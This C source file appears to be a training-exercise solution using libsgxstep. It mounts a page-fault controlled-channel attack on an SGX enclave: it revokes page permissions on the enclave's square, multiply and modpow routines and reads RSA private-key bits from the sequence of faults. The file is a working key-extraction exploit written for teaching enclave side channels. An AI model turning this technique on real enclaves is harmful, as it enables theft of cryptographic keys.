/* utility headers */
#include "libsgxstep/debug.h"
#include "libsgxstep/pf.h"
#include <sys/mman.h>
#include "libsgxstep/pt.h"
#include "libsgxstep/enclave.h"
#include "libsgxstep/pt_abstractions.h"

/* SGX untrusted runtime */
#include <sgx_urts.h>
#include "Enclave/encl_u.h"

#define RSA_TEST_VAL 1234

sgx_enclave_id_t create_enclave(void)
{
    sgx_launch_token_t token = {0};
    int updated = 0;
    sgx_enclave_id_t eid = -1;

    info_event("Creating enclave...");
    SGX_ASSERT(sgx_create_enclave("./Enclave/encl.so", /*debug=*/1,
                                  &token, &updated, &eid, NULL));

    return eid;
}

int fault_fired = 0;
void *sq_pt = NULL, *mul_pt = NULL, *modpow_pt = NULL;

uint64_t *pte_sq, *pte_modpow, *pte_mul;

enum pf_state
{
    MODPOW = 0,
    SQ = 1,
    MUL = 2,
};

// modpow state -> Page 2
// square state -> Page 3
// mul state -> Page 5

#define INIT_MASK 0x10000
uint32_t mask = INIT_MASK;
uint16_t key = 0;
int iteration = 0;

void fault_handler(size_t pagenum)
{
    void *base_adrs = (pagenum << PT_SHIFT) + get_enclave_base();
    // info("Page fault on page %d", pagenum);
    // info("Page fault at address x%" PRIx64, base_adrs);
    enum pf_state state;
    if (base_adrs == sq_pt)
    {
        /* Detected start next iteration */
        if (!(iteration % 16))
        {
            mask = INIT_MASK;
            key = 0;
            info_event("MODPOW INVOCATION");
        }
        iteration++;
        mask = mask >> 1;

        state = SQ;

        pte_removeperms(pte_modpow);
    }
    else if (base_adrs == mul_pt)
    {
        state = MUL;
        pte_removeperms(pte_modpow);

        /* Detected 1 bit */
        key |= mask;
    }
    else if (base_adrs == modpow_pt)
    {
        state = MODPOW;
        pte_removeperms(pte_sq);
        pte_removeperms(pte_mul);
    }
    else
    {
        info("#PF state machine in unknown state! :/");
        abort();
    }

    pte_restoreperms(get_pte_by_address(base_adrs));

    fault_fired++;
}

int main(int argc, char **argv)
{
    mlockall(MCL_FUTURE); // So that pages dont get unmapped

    sgx_enclave_id_t eid = create_enclave();
    int rv = 1, secret = 0;
    int cipher, plain;

    info("registering fault handler..");
    register_fault_handler(fault_handler);

    info_event("Calling enclave..");
    SGX_ASSERT(ecall_get_square_adrs(eid, &sq_pt));
    SGX_ASSERT(ecall_get_multiply_adrs(eid, &mul_pt));
    SGX_ASSERT(ecall_get_modpow_adrs(eid, &modpow_pt));
    modpow_pt = (void *)(((uint64_t)modpow_pt) & ~0xfff);
    info("square at %p; muliply at %p; modpow at %p", sq_pt, mul_pt, modpow_pt);

    SGX_ASSERT(ecall_rsa_encode(eid, &cipher, RSA_TEST_VAL));
    SGX_ASSERT(ecall_rsa_decode(eid, &plain, cipher));
    info("secure enclave encrypted '%d' to '%d'; decrypted '%d'", RSA_TEST_VAL, cipher, plain);

    /* =========================== START SOLUTION =========================== */
    // Remove access, equivalent to PROT_NONE (However prot_none unmaps the page, does inversion and stuff on top)
    ASSERT(pte_sq = get_pte_by_address(sq_pt));
    ASSERT(pte_mul = get_pte_by_address(mul_pt));
    ASSERT(pte_modpow = get_pte_by_address(modpow_pt));
    info("REMAPPING: square_pte at %p; muliply_pte at %p; modpow_pte at %p", pte_sq, pte_mul, pte_modpow);

    pte_removeperms(get_pte_by_address(sq_pt));

    /* =========================== END SOLUTION =========================== */

    SGX_ASSERT(ecall_rsa_decode(eid, &plain, cipher));
    info("secure enclave encrypted '%d' to '%d'; decrypted '%d'", RSA_TEST_VAL, cipher, plain);
    info("--> RECONSTRUCTED KEY '%d' (0x%x)", key, key);

    info_event("destroying SGX enclave");
    SGX_ASSERT(sgx_destroy_enclave(eid));

    info("all is well; exiting..");

    return 0;
}
